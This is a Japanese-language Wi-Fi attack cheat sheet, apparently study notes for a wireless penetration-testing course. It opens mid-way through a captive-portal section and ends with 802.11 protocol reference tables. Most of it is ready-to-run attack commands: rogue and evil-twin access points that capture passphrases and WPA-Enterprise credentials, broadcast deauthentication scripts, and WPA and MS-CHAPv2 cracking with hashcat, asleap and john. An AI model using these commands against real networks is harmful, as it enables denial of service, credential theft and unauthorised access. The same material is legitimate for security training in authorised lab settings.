  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

# Apacheを再起動
sudo systemctl restart apache2
```

### キャプティブポータル用ローグAP

```bash
# hostapd設定
cat > mco-hostapd.conf << 'EOF'
interface=wlan0
ssid=MegaCorp One Lab
channel=11
hw_mode=g
ieee80211n=1
EOF

# APを起動（バックグラウンド）
sudo hostapd -B mco-hostapd.conf

# ログを監視
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
sudo tail -f /var/log/apache2/access.log

# キャプチャしたパスフレーズを検索
sudo find /tmp/ -iname passphrase.txt
sudo cat /tmp/systemd-private-*/tmp/passphrase.txt
```

### IP設定

```bash
# wlan0にIPを割り当て
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```

---

## 11. WPAエンタープライズ攻撃

### 偵察

```bash
# WPAエンタープライズAPを特定（AUTH = MGT）
sudo airodump-ng wlan0mon

# 認証交換をキャプチャ
sudo airodump-ng -c 6 -w enterprise --bssid 00:11:22:33:44:55 wlan0mon

# 再認証を強制するためにDeauth
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon
```

### 証明書抽出（Wireshark）

```
# 証明書フレームでフィルタ
tls.handshake.type == 11
tls.handshake.certificate

# またはBSSID + eapでフィルタ
wlan.bssid == 00:11:22:33:44:55 && eap

# Packet Details内:
# Extensible Authentication Protocol > Transport Layer Security
# > TLSv1 Record Layer: Handshake Protocol: Certificate
# > Handshake Protocol: Certificate > Certificates > Certificate
# 右クリック > Export Packet Bytes（.derとして保存）
```

### 証明書変換

```bash
# 証明書情報を表示
openssl x509 -inform der -in cert.der -text -noout

# DERをPEMに変換
openssl x509 -inform der -in cert.der -outform pem -out cert.pem

# 有効期限を確認
openssl x509 -in cert.pem -noout -enddate
```

### FreeRADIUS証明書生成

```bash
# インストール
sudo apt install freeradius

# 証明書ディレクトリに移動
cd /etc/freeradius/3.0/certs

# CA設定を編集
sudo nano ca.cnf
# [certificate_authority]
# countryName             = JP
# stateOrProvinceName     = Tokyo
# localityName            = Tokyo
# organizationName        = Playtronics
# emailAddress            = ca@playtronics.com
# commonName              = "Playtronics Certificate Authority"

# サーバー設定を編集
sudo nano server.cnf
# [server]
# countryName             = JP
# stateOrProvinceName     = Tokyo
# localityName            = Tokyo
# organizationName        = Playtronics
# emailAddress            = admin@playtronics.com
# commonName              = "Playtronics"

# DHを再生成（2048ビット必須）
sudo rm dh
sudo make

# クリーンアップ（必要な場合）
sudo make destroycerts
```

### hostapd-mana（エンタープライズ）— 完全設定

```bash
# インストール
sudo apt install hostapd-mana

# EAPユーザーファイルを作成
cat > /etc/hostapd-mana/mana.eap_user << 'EOF'
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
EOF

# hostapd-mana設定を作成
cat > /etc/hostapd-mana/mana.conf << 'EOF'
ssid=Playtronics
interface=wlan0
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
EOF

# 起動
sudo hostapd-mana /etc/hostapd-mana/mana.conf

# バックグラウンド
sudo hostapd-mana -B /etc/hostapd-mana/mana.conf
```

### asleap

```bash
# MS-CHAPv2チャレンジ/レスポンスをクラック
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst

# ワードリスト付き
asleap -C <challenge> -R <response> -W wordlist.txt

# hashcatフォーマットを使用
hashcat -m 5500 'cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c' /usr/share/john/password.lst

# Johnフォーマットを使用
john --format=netntlm 'cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4' --wordlist=password.lst
```

### crackapd

```bash
# hostapd-mana認証情報でasleapを自動実行
# インストール（利用可能な場合）
# /tmp/hostapd.credoutを監視し、クラックしたユーザーをEAPユーザーファイルに追加
```

---

## 12. bettercap

### インストールと起動

```bash
# インストール
sudo apt install bettercap

# 特定インターフェースで起動
sudo bettercap -iface wlan0

# caplet付きで起動
sudo bettercap -iface wlan0 -caplet https-ui

# evalコマンド付きで起動
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
```

### Wi-Fi偵察

```
# 偵察開始（チャンネルホッピング）
wifi.recon on

# 偵察停止
wifi.recon off

# チャンネル制限
wifi.recon.channel 1,6,11

# 特定BSSIDをターゲット
wifi.recon 00:11:22:33:44:55

# 偵察データをクリア
wifi.clear

# 発見したAP/ステーションを表示
wifi.show

# クライアント数でソート（降順）
set wifi.show.sort clients desc
wifi.show

# 暗号化でフィルタ（正規表現）
set wifi.show.filter WPA2

# BSSIDプレフィックスでフィルタ
set wifi.show.filter ^c0

# フィルタをクリア
set wifi.show.filter ""

# 最小RSSI
set wifi.rssi.min -49

# 表示AP/クライアント数を制限
set wifi.show.limit 20

# メーカー列を表示
set wifi.show.manufacturer true

# 壊れたフレームをスキップ
set wifi.skip-broken true
```

### Wi-Fi Deauth

```
# AP上の全クライアントをDeauth
wifi.deauth 00:11:22:33:44:55

# 特定クライアントをDeauth
wifi.deauth 00:AA:BB:CC:DD:EE

# 全てをDeauth（ブロードキャスト）
wifi.deauth ff:ff:ff:ff:ff:ff

# スキップリスト（Deauthしない）
set wifi.deauth.skip 00:AA:BB:CC:DD:EE

# ハンドシェイクキャプチャ済みならスキップ
set wifi.deauth.acquired false

# オープンネットワークをDeauth
set wifi.deauth.open true

# サイレントモード（Deauthメッセージを非表示）
set wifi.deauth.silent false

# ハンドシェイク出力ファイル
set wifi.handshakes.file "~/handshakes/"
set wifi.handshakes.aggregate false
```

### bettercap Caplets

```bash
# 例: massdeauth.cap
cat > massdeauth.cap << 'EOF'
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}
set ticker.period 10
set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff
wifi.recon on
ticker on
events.clear
clear
EOF

# 例: deauth_corp.cap
cat > deauth_corp.cap << 'EOF'
set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth 00:11:22:33:44:55
events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new
wifi.recon on
ticker on
events.clear
clear
EOF

# capletを実行
include deauth_corp.cap

# またはコマンドラインから
sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```

### bettercap Webインターフェース

```bash
# Web UIを設定
sudo nano /usr/share/bettercap/caplets/https-ui.cap
# 変更:
# set api.rest.username offsec
# set api.rest.password wifu

# Web UI付きで起動
sudo bettercap -iface wlan0 -caplet https-ui

# https://<ip>:443 でアクセス
# APIは https://<ip>:8083

# nftablesでアクセスを制限
sudo nft add table inet filter
sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 443 accept
sudo nft add rule inet filter INPUT ip saddr 192.168.62.192 tcp dport 8083 accept

# ブラウザで証明書警告を承認
```

### bettercap — Ticker

```
# tickerコマンドを設定
set ticker.commands "clear; wifi.show"

# ticker期間を設定（秒）
set ticker.period 5

# tickerを開始
ticker on

# tickerを停止
ticker off
```

---

## 13. Kismet

### インストールと設定

```bash
# インストール
sudo apt install kismet

# 設定ファイル
ls -la /etc/kismet/
# kismet.conf              - メイン設定
# kismet_80211.conf        - Wi-Fi設定
# kismet_alerts.conf       - WIDSアラート
# kismet_filter.conf       - フィルタリング
# kismet_httpd.conf        - Webサーバー
# kismet_logging.conf      - ログ
# kismet_memory.conf       - メモリ
# kismet_uav.conf          - ドローン検出

# オーバーライドファイル（作成）
sudo nano /etc/kismet/kismet_site.conf
# log_prefix=/var/log/kismet/
# log_types=kismet,pcapng
# httpd_bind_address=127.0.0.1

# ログディレクトリを作成
sudo mkdir /var/log/kismet
```

### Kismet実行

```bash
# インターフェースで起動（自動モニターモード）
sudo kismet -c wlan0

# ncursesなし（全出力）
sudo kismet -c wlan0 --no-ncurses

# チャンネル制限
sudo kismet -c wlan0:channels="1,6,11"

# デーモン化
sudo kismet --daemonize

# ログなし（デバッグ）
sudo kismet -c wlan0 --no-logging

# ログタイプを設定
sudo kismet -c wlan0 -T kismet,pcapng

# ログプレフィックスを設定
sudo kismet -c wlan0 -p /var/log/kismet/

# pcapファイルを処理（リアルタイム）
sudo kismet -c capture.pcap:realtime=true

# pcapを処理（1秒あたりのパケット数）
sudo kismet -c capture.pcap:pps=1000

# Kismetを停止
# C+c または PIDをkill
ps aux | grep kismet
kill -9 <pid>
```

### Kismetリモートキャプチャ

```bash
# サーバー（Kaliホスト）— ソースなしでKismetを起動
sudo kismet

# クライアント（リモート）— SSHトンネル
ssh kali@192.168.62.192 -L 8000:localhost:3501

# クライアント — キャプチャ開始
sudo kismet_cap_linux_wifi --connect 127.0.0.1:8000 --user offsec --password lab --source=wlan0:name=remote-wlan0
```

### Kismet Webインターフェース

```bash
# デフォルトURL: http://localhost:2501
# 初回ログイン: ユーザーアカウントを作成

# バインドアドレスを変更
sudo nano /etc/kismet/kismet_site.conf
# httpd_bind_address=127.0.0.1

# HTTPSを有効化
# kismet_httpd.conf で設定
```

### Kismetログエクスポート

```bash
# kismetログのデータソースを一覧表示
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --list-datasources

# kismetをpcapngに変換
kismetdb_to_pcap --in Kismet-20200917-18-45-34-1.kismet --out sample.pcapng --verbose

# デバイスをJSONにエクスポート
kismetdb_dump_devices --in /var/log/kismet/Kismet-20200917-17-45-17-1.kismet --out sample.json --skip-clean --verbose

# sqlite3でkismetデータベースをクエリ
sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet

# テーブル:
# .tables
# KISMET, alerts, data, datasources, devices, messages, packets, snapshots

# devicesテーブルのスキーマ
.schema devices

# デバイスをクエリ
select type, devmac from devices;

# ワンライナークエリ
sqlite3 /var/log/kismet/Kismet-20200917-18-45-34-1.kismet "select type, devmac from devices;"
```

---

## 14. 手動ネットワーク接続

### wpa_supplicant（オープンネットワーク）

```bash
# 設定
cat > wifi-client.conf << 'EOF'
network={
  ssid="hotel_wifi"
  scan_ssid=1
}
EOF

# 起動
sudo wpa_supplicant -i wlan0 -c wifi-client.conf

# バックグラウンド
sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B
```

### wpa_supplicant（WPA-PSK）

```bash
# 設定
cat > wifi-client.conf << 'EOF'
network={
  ssid="home_network"
  scan_ssid=1
  psk="correct battery horse staple"
  key_mgmt=WPA-PSK
}
EOF

# CCMPを強制
# 追加: pairwise=CCMP
# TKIPを強制
# 追加: pairwise=TKIP

# 起動
sudo wpa_supplicant -i wlan0 -c wifi-client.conf

# バックグラウンド
sudo wpa_supplicant -i wlan0 -c wifi-client.conf -B
```

### wpa_passphrase

```bash
# PSKを生成（パスフレーズを促す）
wpa_passphrase MyNetwork

# PSKを生成（パスフレーズを引数に）
wpa_passphrase MyNetwork "password123"

# ファイルに出力
wpa_passphrase MyNetwork "password123" > home_network.conf
```

### dhclient

```bash
# DHCPリースを取得
sudo dhclient wlan0

# リースを解放
sudo dhclient -r wlan0
```

### dnsmasq（DHCPサーバー）

```bash
# インストール
sudo apt install dnsmasq

# 設定
cat > dnsmasq.conf << 'EOF'
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
listen-address=10.0.0.1
dhcp-range=10.0.0.100,10.0.0.199,12h
dhcp-lease-max=100
dhcp-option=option:router,10.0.0.1
dhcp-authoritative
server=8.8.8.8
server=8.8.4.4
EOF

# 起動
sudo dnsmasq --conf-file=dnsmasq.conf

# syslogを確認
sudo tail /var/log/syslog | grep dnsmasq
```

### IPフォワーディングとNAT

```bash
# IPフォワーディングを有効化
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# nftablesをインストール
sudo apt install nftables

# NATテーブルを追加
sudo nft add table nat

# postroutingチェーンを追加
sudo nft 'add chain nat postrouting { type nat hook postrouting priority 100 ; }'

# マスカレードルールを追加
sudo nft add rule ip nat postrouting oifname "eth0" ip daddr != 10.0.0.1/24 masquerade

# ルールをフラッシュ（クリーンアップ）
sudo nft flush ruleset
```

### hostapd（アクセスポイント）

```bash
# インストール
sudo apt install hostapd

# 設定（WPA2 PSK）
cat > hostapd.conf << 'EOF'
interface=wlan0
ssid=BTTF
channel=11
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=GreatScott
EOF

# 起動
sudo hostapd hostapd.conf

# バックグラウンド
sudo hostapd -B hostapd.conf
```

### APインターフェースの静的IP

```bash
sudo ip link set wlan0 up
sudo ip addr add 10.0.0.1/24 dev wlan0
```

---

## 15. ワードリスト生成とマングリング

### John the Ripper

```bash
# 基本ワードリストモード
john --wordlist=password.lst --rules --stdout

# aircrack-ngにパイプ
john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e "TargetNet" -w - capture.cap

# ルールを編集
sudo nano /etc/john/john.conf
# [List.Rules:Wordlist] の下に追加:
# $[0-9]$[0-9]
# $[0-9]$[0-9]$[0-9]

# ルールをテスト
john --wordlist=password.lst --rules --stdout | grep -i Password123

# 特定のルール
john --wordlist=password.lst --rules=Wordlist --stdout
```

### Crunch

```bash
# 基本ワードリスト（8-9文字、全印刷可能文字）
crunch 8 9

# 文字セット付き
crunch 8 9 abc123

# パターン（password + 3桁）
crunch 11 11 -t password%%%

# 文字セット付きパターン
crunch 11 11 0123456789 -t password@@@

# 順列（繰り返しなし）
crunch 1 1 -p abcde12345

# 複数単語（順列）
crunch 1 1 -p dog cat bird

# パターン + 順列
crunch 5 5 -t ddd%% -p dog cat bird

# パターン + 文字セット + 順列
crunch 5 5 aADE -t ddd@@ -p dog cat bird

# aircrack-ngにパイプ
crunch 11 11 -t password%%% | aircrack-ng -e "TargetNet" -w - capture.cap
```

### RSMangler

```bash
# ワードリストを作成
echo bird > wordlist.txt
echo cat >> wordlist.txt
echo dog >> wordlist.txt

# 基本マングリング
rsmangler --file wordlist.txt

# ファイルに出力
rsmangler --file wordlist.txt --output mangled.txt

# 重複チェックを無効化（高速）
rsmangler --file wordlist.txt --allow-duplicates

# 単語長を制限
rsmangler --file wordlist.txt --min 12 --max 13

# stdinからパイプ
cat wordlist.txt | rsmangler --file -

# aircrack-ngにパイプ
rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e "TargetNet" -w - capture.cap
```

---

## 16. Hashcat

### デバイス情報とベンチマーク

```bash
# デバイスを一覧表示
hashcat -I

# 全モードをベンチマーク（遅い）
hashcat -b

# 特定モードをベンチマーク
hashcat -b -m 2500    # WPA-EAPOL-PBKDF2（非推奨）
hashcat -b -m 22000   # WPA-PBKDF2-PMKID+EAPOL

# デバイス指定
hashcat -d 1 -m 22000 hash.hc22000 wordlist.txt

# デバイスタイプ指定（1=CPU, 2=GPU, 3=FPGA）
hashcat -D 2 -m 22000 hash.hc22000 wordlist.txt
```

### WPAクラッキング

```bash
# PCAPをhccapxに変換（2500モード）
/usr/lib/hashcat-utils/cap2hccapx.bin capture.cap output.hccapx

# 2500モードでクラック（非推奨）
hashcat -m 2500 --deprecated-check-disable output.hccapx wordlist.txt

# 22000モードに変換
hcxpcapngtool -o hash.hc22000 capture.cap

# 22000モードでクラック
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt

# ルール付き
hashcat -a 0 -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# マスク攻撃
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d

# セッション管理
hashcat --session mysession -m 22000 hash.hc22000 wordlist.txt
hashcat --session mysession --restore

# ポットファイル
cat ~/.hashcat/hashcat.potfile
rm ~/.hashcat/hashcat.potfile
```

### MS-CHAPv2（エンタープライズ）

```bash
# MS-CHAPv2をクラック
hashcat -m 5500 'cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c' wordlist.txt
```

### Hashcatユーティリティ

```bash
# インストール
sudo apt install hashcat-utils

# cap2hccapx — PCAPをhccapxに変換
/usr/lib/hashcat-utils/cap2hccapx.bin capture.cap output.hccapx
# 引数: input.cap output.hccapx [ESSID:BSSID]

# その他のユーティリティは /usr/lib/hashcat-utils/ に
ls /usr/lib/hashcat-utils/
```

---

## 17. フレームタイプと802.11プロトコルリファレンス

### フレームコントロールフィールド

```
Protocol Version (2ビット)  — 0（現在）
Type (2ビット)              — 0=管理、1=制御、2=データ、3=拡張
Subtype (4ビット)           — 下記テーブル参照
To DS (1ビット)
From DS (1ビット)
More Frag (1ビット)
Retry (1ビット)
Power Mgmt (1ビット)         — 0=アクティブ、1=パワーセーブ
More Data (1ビット)
Protected Frame (1ビット)    — 0=非暗号化、1=暗号化
+HTC/Order (1ビット)
```

### 管理フレームサブタイプ

| サブタイプ | フレーム |
|---------|-------|
| 0 | アソシエーションリクエスト |
| 1 | アソシエーションレスポンス |
| 2 | 再アソシエーションリクエスト |
| 3 | 再アソシエーションレスポンス |
| 4 | プローブリクエスト |
| 5 | プローブレスポンス |
| 6 | 測定パイロット |
| 8 | ビーコン |
| 9 | ATIM |
| 10 | ディスアソシエーション |
| 11 | 認証 |
| 12 | 認証解除 |
| 13 | アクション |
| 14 | アクションNo ACK |

### 制御フレームサブタイプ

| サブタイプ | フレーム |
|---------|-------|
| 7 | コントロールラッパー |
| 8 | ブロックACKリクエスト |
| 9 | ブロックACK |
| 10 | PS-Poll |
| 11 | RTS |
| 12 | CTS |
| 13 | ACK |
| 14 | CF End |
| 15 | CF End + CF-ACK |

### データフレームサブタイプ

| サブタイプ | フレーム |
|---------|-------|
| 0 | データ |
| 1 | データ + CF ACK |
| 2 | データ + CF Poll |
| 3 | データ + CF ACK + CF Poll |
| 4 | Nullファンクション（データなし） |
| 8 | QoSデータ |
| 12 | QoS Null（データなし） |

### アドレスフィールド（ToDS/FromDS）

| FromDS | ToDS | アドレス1 | アドレス2 | アドレス3 | アドレス4 |
|--------|------|-----------|-----------|-----------|-----------|
| 0 | 0 | 宛先 | 送信元 | BSSID | N/A |
| 0 | 1 | BSSID | 送信元 | 宛先 | N/A |
| 1 | 0 | 宛先 | BSSID | 送信元 | N/A |
| 1 | 1 | 受信者 | 送信者 | 宛先 | 送信元 |

### EAPoL Keyフレーム構造

```
Protocol Version (1バイト)     — 1、2、3（802.1X-2001/2004/2010）
Packet Type (1バイト)          — 3 = key
Packet Body Length (2バイト)
Descriptor Type (1バイト)      — 2=EAPoL RSN Key（WPA2）、254=EAPoL WPA Key（WPA1）
Key Information (2バイト)      — フラグ（下記参照）
Key Length (2バイト)           — 5/13=WEP40/104、16/32=TKIP/CCMP
Replay Counter (8バイト)       — インクリメント
Key Nonce (32バイト)           — ANonceまたはSNonce
EAPoL Key IV (16バイト)        — 未使用時0
Key Receive Sequence Counter (8バイト)
Key Identifier (8バイト)       — 予約、0に設定
Key MIC (可変)                 — パケットのMIC
Key Data Length (2バイト)
Key Data (可変)                — RSNEまたはKDE
```

### Key Informationフラグ

```
Key Descriptor Version (ビット0-2)  — 1=ARC4+HMAC-MD5、2=AES+HMAC-SHA1-128、3=AES+AES-128-CMAC
Key Type (ビット3)                  — 1=PTK、0=GTK/SMK
Install (ビット6)                   — キーをインストール
Key ACK (ビット7)                   — EAPoL-Keyレスポンスを期待
Key MIC (ビット8)                   — MIC存在
Secure (ビット9)                    — 鍵交換完了
Error (ビット10)                    — MIC失敗
Request (ビット11)                  — ハンドシェイクを要求
Encrypted Key Data (ビット12)       — Key Data暗号化
SMK Message (ビット13)              — SMKハンドシェイク
```

### WPA 4-Wayハンドシェイク

```
メッセージ1: AP -> クライアント
  ANonce、Key Information（ACK、MIC）、Replay Counter

メッセージ2: クライアント -> AP
  SNonce、MIC、RSN IE、Replay Counter

メッセージ3: AP -> クライアント
  ANonce、MIC、GTK（暗号化）、RSN IE、Replay Counter

メッセージ4: クライアント -> AP
  MIC、Replay Counter、ACK
```

### WPA3 SAE（Dragonfly）ハンドシェイク

```
Commit交換:
  クライアント -> AP: Commit（スカラー、要素）
  AP -> クライアント: Commit（スカラー、要素）

Confirm交換:
  クライアント -> AP: Confirm（A-Confirm）
  AP -> クライアント: Confirm（B-Confirm）

その後4-wayハンドシェイク（WPA2と同様）
```

### WEP認証

```
オープン認証:
  クライアント -> AP: 認証リクエスト（アルゴリズム=0、seq=1）
  AP -> クライアント: 認証レスポンス（成功）

共有認証:
  クライアント -> AP: 認証リクエスト（アルゴリズム=1、seq=1）
  AP -> クライアント: チャレンジテキスト（seq=2）
  クライアント -> AP: 暗号化チャレンジ（seq=3）
  AP -> クライアント: 認証レスポンス（成功/失敗）
```

### WPS登録プロトコル

```
M1 = Version || N1 || Description || PKE
M2 = Version || N1 || N2 || Description || PKR || ConfigData || HMACAuthKey(M1 || M2*)
M3 = Version || N2 || E-Hash1 || E-Hash2 || HMACAuthKey(M2 || M3*)
M4 = Version || N1 || R-Hash1 || R-Hash2 || ENCKeyWrapKey(R-S1) || HMACAuthKey(M3 || M4*)
M5 = Version || N2 || ENCKeyWrapKey(E-S1) || HMACAuthKey(M4 || M5*)
M6 = Version || N1 || ENCKeyWrapKey(R-S2) || HMACAuthKey(M5 || M6*)
M7 = Version || N2 || ENCKeyWrapKey(E-S2 || ConfigData) || HMACAuthKey(M6 || M7*)
M8 = Version || N1 || ENCKeyWrapKey(ConfigData) || HMACAuthKey(M7 || M8*)
```

### PMF / 802.11w接続マトリクス

| AP | クライアント | 接続 | PMF |
|----|--------|-----------|-----|
| No | No | Yes | No |
| No | Capable | Yes | No |
| No | Required | No | — |
| Capable | No | Yes | No |
| Capable | Capable | Yes | Yes |
| Capable | Required | Yes | Yes |
| Required | No | No | — |
| Required | Capable | Yes | Yes |
| Required | Required | Yes | Yes |

### 802.11標準リファレンス

| 標準 | バンド | 最大レート | 機能 |
|----------|------|----------|----------|
| 802.11 | 2.4 GHz | 2 Mbps | DSSS/FHSS |
| 802.11a | 5 GHz | 54 Mbps | OFDM |
| 802.11b | 2.4 GHz | 11 Mbps | CCK |
| 802.11g | 2.4 GHz | 54 Mbps | OFDM、bと後方互換 |
| 802.11h | 5 GHz | — | DFS/TPC |
| 802.11i | — | — | WPA2/CCMP |
| 802.11n（Wi-Fi 4） | 2.4/5 GHz | 600 Mbps | MIMO、HT40 |
| 802.11ac（Wi-Fi 5） | 5 GHz | 6.9 Gbps | VHT、MU-MIMO、80/160 MHz |
| 802.11ad（WiGig） | 60 GHz | 6.7 Gbps | マルチギガビット |
| 802.11ax（Wi-Fi 6） | 2.4/5/6 GHz | 9.6 Gbps | OFDMA、1024-QAM |
| 802.11be（Wi-Fi 7） | 2.4/5/6 GHz | 46 Gbps | EHT、320 MHz |
| 802.11w | — | — | PMF（Protected Management Frames） |

### 暗号化リファレンス

| プロトコル | 暗号 | 鍵長 | IV長 | 完全性 |
|----------|--------|----------|---------|-----------|
| WEP | RC4 | 40/104ビット | 24ビット | CRC-32 |
| WPA (TKIP) | RC4 | 128ビット | 48ビット | Michael |
| WPA2 (CCMP) | AES | 128ビット | 48ビット | CBC-MAC |
| WPA3 (CCMP) | AES | 128ビット | 48ビット | CBC-MAC |
| WPA3 (GCMP-256) | AES | 256ビット | 48ビット | GMAC |
| OWE | AES | 128/256ビット | — | — |

---

## 18. ワイヤレスネットワークアーキテクチャ

### インフラストラクチャ

```
BSS（Basic Service Set）:
  - 1 AP + 1以上のSTA
  - APはDS（Distribution System / 有線ネットワーク）に接続

ESS（Extended Service Set）:
  - 同一DSに接続された2以上のAP
  - 同一SSID（ESSID）
  - 複数のBSSID

Linux用語:
  - Managedモード = ステーション
  - Masterモード = AP
```

### WDS（Wireless Distribution System）

```
- ケーブルの代わりにWi-Fi経由のDS
- 2つのモード:
  - Wireless Bridging: WDS AP同士のみ通信
  - Wireless Repeating: STAとAPが通信
- 通常バックホールにAPと同じチャンネルを使用
- 高トラフィックネットワークではデータレートが半減する可能性
```

### Ad-Hoc（IBSS）

```
- Independent Basic Service Set
- 2以上のSTA、APなし
- 1つのSTAがAPの役割（ビーコニング、認証）を担う
- APのようにパケットを中継しない
- Ad-Hoc Demo（Pseudo-IBSS）:
  - 管理フレームなし
  - ビーコニングなし、アソシエーションなし
  - BSSID = 全てゼロ
  - 手動レート設定
```

### メッシュ（802.11s）

```
- 全APが対等、役割なし
- ケーブル配線が困難な場所でネットワークを拡張
- デバイスクラス:
  - MP（Mesh Point）: メッシュデバイス間のリンク
  - MAP（Mesh AP）: MP + AP機能
  - MPP（Mesh Portal）: 有線ネットワークへのリンク
- ピアリングモード:
  - MPM（Mesh Peering Management）: 非セキュア
  - AMPE（Authenticated Mesh Peering Exchange）: セキュア
    - SAEまたは802.1Xを使用
- ルーティング: HWMP（デフォルト）、AODV、BATMAN、OLSR
- 最大32ノード（802.11s）
- プロプライエタリメッシュ: 相互運用不可
```

### Wi-Fi Direct（Wi-Fi P2P）

```
- デバイス間の直接接続
- 802.11標準ではない — Wi-Fi Alliance仕様
- ソフトウェアAP + WPS形式接続
- WPA2暗号化
- サービスディスカバリ
- 1対1またはグループ
- ユースケース: 印刷、ファイル共有、Miracast、ゲーム、テザリング
```

### モニターモード

```
- 範囲内の全802.11フレームをキャプチャ
- アソシエーション不要
- 必須:
  - パケットキャプチャ（生802.11）
  - パケットインジェクション
  - 認証解除攻撃
  - ハンドシェイクキャプチャ
- airmon-ng、iw、iwconfigで有効化
- インターフェースは通常wlanXmonにリネーム
```

---

## クイックリファレンス — 最も使用されるコマンド

```bash
# モニターモード
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# スキャン
sudo airodump-ng wlan0mon

# ハンドシェイクキャプチャ
sudo airodump-ng -c 6 -w capture --bssid 00:11:22:33:44:55 wlan0mon
sudo aireplay-ng -0 1 -a 00:11:22:33:44:55 -c 00:AA:BB:CC:DD:EE wlan0mon

# WPAクラック
aircrack-ng -w wordlist.txt -e "TargetNet" -b 00:11:22:33:44:55 capture-01.cap

# WPS攻撃
sudo wash -i wlan0mon
sudo reaver -b 00:11:22:33:44:55 -i wlan0mon -v -K

# ローグAP
sudo hostapd-mana rogue.conf
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan1mon

# エンタープライズ攻撃
sudo hostapd-mana /etc/hostapd-mana/mana.conf
asleap -C <challenge> -R <response> -W wordlist.txt

# bettercap
sudo bettercap -iface wlan0
wifi.recon on
wifi.deauth 00:11:22:33:44:55

# Kismet
sudo kismet -c wlan0

# Hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt
hashcat -m 5500 'user::::response:challenge' wordlist.txt
```
